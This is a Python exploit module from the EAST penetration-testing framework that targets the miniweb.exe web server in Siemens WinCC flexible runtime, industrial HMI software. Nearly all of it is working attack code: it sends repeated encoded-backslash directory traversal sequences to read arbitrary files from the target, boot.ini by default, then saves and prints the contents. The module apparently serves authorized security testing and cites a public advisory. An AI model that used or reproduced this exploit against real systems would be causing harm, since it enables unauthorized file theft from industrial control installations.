#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_wincc_miniweb_dt"
INFO['DESCRIPTION'] = "Siemens WINCC flixible runtime 2008 SP2 + SP 1, miniweb.exe Directory traversal"
INFO['VENDOR'] = "http://www.automation.siemens.com/mcms/human-machine-interface/en/visualization-software/wincc-flexible/wincc-flexible-runtime/Pages/Default.aspx"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = 'http://aluigi.altervista.org/adv/winccflex_1-adv.txt'
INFO["CVE Name"] = "?"
INFO["NOTES"] = """
Reference --> http://aluigi.altervista.org/adv/winccflex_1-adv.txt section D]
    
    Form vendor:
    WinCC flexible is ideal for use as a Human Machine Interface (HMI) in
    any machine or process-level application in plant, machine and
    series-machine construction. WinCC flexible is designed for all sectors
    of industry and offers engineering software for all SIMATIC HMI
    operator panels, from the smallest Micro Panel to the Multi Panel, as
    well as runtime visualization software for PC-based single-user systems
    running under Windows XP / Windows 7.
    miniweb.exe is a small webserver that listens on 80 and 443 ports by
        default.
    miniweb.exe is affected by a directory traversal vulnerability 
    trough the usage of encoded backslashes."""

INFO['CHANGELOG'] = "14 Aug, 2015. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = "80"
OPTIONS["FILENAME"] = ''

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = None
        self.filename = None
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.filename = self.args.get('FILENAME', 'boot.ini')
        return
    
    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def makerequest(self):
        sequence = '..%5c' * 8
        selector = '/%s/%s' % (sequence, self.filename.replace(" ", "%20"))
        return selector
        
    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        try:
            response = urllib2.urlopen(self.make_url(self.makerequest()))
            if response.code == 200:
                data = response.read()
                self.log("File successfully loaded from %s server." % (self.host))
                self.writefile(data, self.filename)
                self.log('===Content of file===')
                self.log(data)
                self.log('=========End=========')
                
                self.finish(True)
                return 1
            else:
                self.log("File loading failed!")
                self.finish(False)
                return 0
        except:
            self.log("File loading failed!")
            self.finish(False)
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
    